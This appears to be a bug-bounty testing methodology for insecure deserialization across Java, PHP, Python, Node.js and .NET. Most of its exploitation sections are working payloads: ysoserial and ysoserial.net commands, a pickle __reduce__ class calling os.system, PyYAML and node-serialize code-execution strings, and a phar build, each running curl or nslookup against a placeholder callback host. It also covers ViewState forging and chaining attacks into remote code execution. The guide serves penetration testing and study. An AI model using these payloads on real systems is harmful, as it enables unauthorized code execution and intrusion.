# Insecure Deserialization — Deep Testing Methodology

## Overview
Insecure deserialization is a **P1/Critical** vulnerability class that often leads directly to Remote Code Execution (RCE). When applications deserialize untrusted data, attackers can manipulate serialized objects to achieve arbitrary code execution, authentication bypass, or data tampering.

## Why This Matters
- Frequently leads to RCE — the highest severity finding
- Bug bounty payouts: $10,000–$50,000+
- Present across all major language ecosystems
- Often missed by automated scanners

## Detection: Identify Serialized Data

### Fingerprint Patterns
```
Java:         rO0AB (Base64) or AC ED 00 05 (hex) or H4sIAAAA (gzip+Base64)
PHP:          a:2:{s:4:"name";s:5:"admin";} or O:8:"ClassName":1:{...}
Python:       gASV (Base64 pickle) or \x80\x05\x95 (raw pickle bytes)
.NET:         AAEAAAD///// (BinaryFormatter) or <root type="..."> (XML)
Node.js:      {"rce":"_$$ND_FUNC$$_function(){...}"}
Ruby:         \x04\x08o: (Marshal.load)
```

### Where to Look
```bash
# Check cookies for serialized data
curl -v "https://TARGET/" 2>&1 | grep -i "Set-Cookie"
# Decode Base64 cookies
echo "COOKIE_VALUE" | base64 -d | xxd | head -5

# Check request/response bodies
# ViewState (.NET): <input type="hidden" name="__VIEWSTATE" value="...">
# Java: Content-Type: application/x-java-serialized-object

# Check URL parameters
curl -s "https://TARGET/?data=rO0ABXNyAA..." 

# Check common deserialization endpoints
for path in /api/import /api/upload /api/deserialize /xmlrpc.php /jmx-console /invoker/JMXInvokerServlet; do
  curl -s -o /dev/null -w "%{http_code} $path\n" "https://TARGET${path}"
done
```

## Java Deserialization

### Detection
```bash
# Check for Java serialized objects
curl -s "https://TARGET/" -H "Content-Type: application/x-java-serialized-object" -d ""

# Check for known vulnerable endpoints
# JBoss
curl -s "https://TARGET/invoker/JMXInvokerServlet" | xxd | head
# Jenkins
curl -s "https://TARGET/cli"
# WebLogic
curl -s "https://TARGET/wls-wsat/CoordinatorPortType"
# Apache Struts
curl -s "https://TARGET/" -H "Content-Type: %{(#_='multipart/form-data')}"
```

### Exploitation with ysoserial
```bash
# Generate payloads for different libraries
# CommonsCollections (most common)
java -jar ysoserial.jar CommonsCollections1 'curl YOUR-CALLBACK-SERVER' | base64

# Other gadget chains
java -jar ysoserial.jar CommonsCollections5 'curl YOUR-CALLBACK-SERVER' | base64
java -jar ysoserial.jar CommonsCollections6 'curl YOUR-CALLBACK-SERVER' | base64
java -jar ysoserial.jar CommonsBeanutils1 'curl YOUR-CALLBACK-SERVER' | base64
java -jar ysoserial.jar Spring1 'curl YOUR-CALLBACK-SERVER' | base64
java -jar ysoserial.jar Hibernate1 'curl YOUR-CALLBACK-SERVER' | base64

# Test with DNS callback (safest, works through firewalls)
java -jar ysoserial.jar URLDNS 'https://YOUR-BURP-COLLAB.burpcollaborator.net' | base64
```

### Without ysoserial (manual)
```python
import subprocess
import base64

# Generate DNS callback payload manually
# Replace HOSTNAME with your callback server
payload_hex = "aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c647870"
# ... (abbreviated — use ysoserial in practice)
```

## PHP Deserialization

### Detection
```bash
# Look for serialized PHP in parameters/cookies
# PHP serialized format: O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

# Test with manipulated objects
curl "https://TARGET/?data=O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";}"

# phar:// deserialization (file upload + phar)
# If you can upload a file, create a phar archive with a malicious object
```

### Exploitation
```php
<?php
// Property injection — change role to admin
$payload = 'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}';

// PHP Object Injection — dangerous magic methods
// __wakeup(), __destruct(), __toString(), __call()
$payload = 'O:8:"Vuln_Obj":1:{s:4:"file";s:11:"/etc/passwd";}';

// Phar deserialization
// Create phar with malicious metadata:
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$obj = new VulnClass();
$obj->cmd = 'id';
$phar->setMetadata($obj);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
// Trigger via: file_get_contents("phar://uploads/exploit.jpg/test.txt")
?>
```

## Python Pickle Deserialization

### Detection
```python
import base64
import pickle

# Check if endpoint accepts pickled data
# Look for: Content-Type: application/octet-stream, application/python-pickle
# Base64 encoded pickle starts with: gASV

# Test if response changes with modified pickle
```

### Exploitation
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl YOUR-CALLBACK-SERVER',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Payload: {payload}")

# More stealthy — DNS callback only
class DNSCallback:
    def __reduce__(self):
        return (os.system, ('nslookup YOUR-CALLBACK.burpcollaborator.net',))

# For PyYAML (yaml.load without Loader)
yaml_payload = """
!!python/object/apply:os.system
- 'curl YOUR-CALLBACK-SERVER'
"""
```

## Node.js Deserialization

### Detection
```bash
# node-serialize: vulnerable to RCE via IIFE
# Look for JSON with function strings

# Check if endpoint accepts JSON with functions
curl -X POST "https://TARGET/api/data" \
  -H "Content-Type: application/json" \
  -d '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl YOUR-CALLBACK\");}()"}'
```

### Exploitation
```javascript
// node-serialize RCE payload
var payload = {
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('curl YOUR-CALLBACK-SERVER', function(error, stdout, stderr) { });}()"
};

// js-yaml (before 3.13.0)
// !!js/function "function(){ ... }"

// flatted / circular-json manipulation
// Modify __proto__ or constructor references
```

## .NET Deserialization

### Detection
```bash
# Check for __VIEWSTATE (ASP.NET)
curl -s "https://TARGET/" | grep -oP '__VIEWSTATE[^>]+value="[^"]+"' 

# Check ViewState MAC validation
# If MAC is disabled → direct exploitation
# Tool: ysoserial.net

# BinaryFormatter endpoints
curl -s "https://TARGET/api/import" -H "Content-Type: application/octet-stream"
```

### Exploitation
```bash
# ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "curl YOUR-CALLBACK" -o base64

# ViewState (if MAC disabled)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "curl YOUR-CALLBACK" --path="/target.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

## Severity Classification
| Finding | Severity | CVSS |
|---------|----------|------|
| Deserialization → RCE | Critical | 9.8 |
| Deserialization → file read (LFI) | High | 7.5 |
| Deserialization → auth bypass | Critical | 9.1 |
| Deserialization → DoS (billion laughs) | Medium | 5.3 |
| Deserialization → SSRF | High | 7.5 |

## Chaining Strategies
1. **File Upload + Phar Deserialization → RCE**: Upload .phar as .jpg → trigger via phar:// wrapper
2. **SSRF + Java Deserialization → RCE**: SSRF to internal JMX/RMI port → deserialize exploit
3. **XXE + Deserialization → RCE**: XXE to read serialized session → modify → inject
4. **ViewState + Weak Key → RCE**: Extract/brute ViewState key → forge malicious ViewState
